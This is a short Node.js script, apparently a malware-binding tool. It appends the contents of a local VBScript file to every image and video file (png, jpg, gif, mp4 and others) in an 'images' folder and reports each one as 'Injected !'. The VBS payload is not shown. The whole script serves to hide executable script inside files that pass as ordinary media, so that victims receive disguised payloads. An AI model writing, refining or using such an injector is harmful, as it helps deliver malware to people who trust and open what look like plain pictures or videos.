var fs = require("fs")
var Color = require("sync-color");
//Color.init()
var end = ["png", "jpg", "jpeg", "webm", "mp4", "mov", "webp", "gif"]
var inject = []
var getCode = () => fs.readFileSync("./code.vbs").toString()
if (!fs.existsSync("./images")) return fs.mkdirSync("./images") ^ console.log(Color.InitGradient("blue", "cyan")("Please, Put A IMG or a VIDEO Into The \"Image\" Folder"))
var read = fs.readdirSync("./images")
if (read[0]) {
    end.forEach(b => read.forEach(z => z.split(".").pop() == b ? inject.push(z) : ""))
    inject.forEach(r => {
        var path = `./images/${r}`
        if (fs.readFileSync(path).includes(getCode())) return console.log(Color.InitGradient("blue", "cyan")(`${r} Already Injected !`))
        fs.appendFileSync(path, getCode())
        console.log(Color.InitGradient("blue", "cyan")(`${r} Injected !`))
    })
}